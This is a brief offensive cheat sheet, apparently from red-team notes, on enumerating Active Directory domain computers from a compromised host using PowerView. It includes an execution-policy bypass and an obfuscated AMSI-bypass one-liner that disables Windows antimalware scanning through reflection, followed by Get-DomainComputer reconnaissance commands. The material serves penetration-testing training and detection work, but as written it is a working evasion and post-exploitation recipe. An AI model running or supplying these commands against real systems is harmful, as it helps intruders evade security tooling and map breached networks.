# Domain Computers and Servers Enumeration


## PowerView
Import PowerView to the compromised host and run the following commands


`powershell -ep bypass`

Bypass AMSI with this PowerShell command.

```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

Import the script

`. .\powerview.ps1`


Enumerate servers in the network:

`Get-DomainComputer`

Enumerate operating systems:

`Get-DomainComputer -OperatingSystem "*server 2016*"`

Check host's connection to the computers in the network:

`Get-DomainComputer -Ping`

Enumerate a specific machine by DNS host name:

`Get-DomainComputer  -Name fileshare.domain.local`

`Get-DomainComputer  -Name web.domain.local`

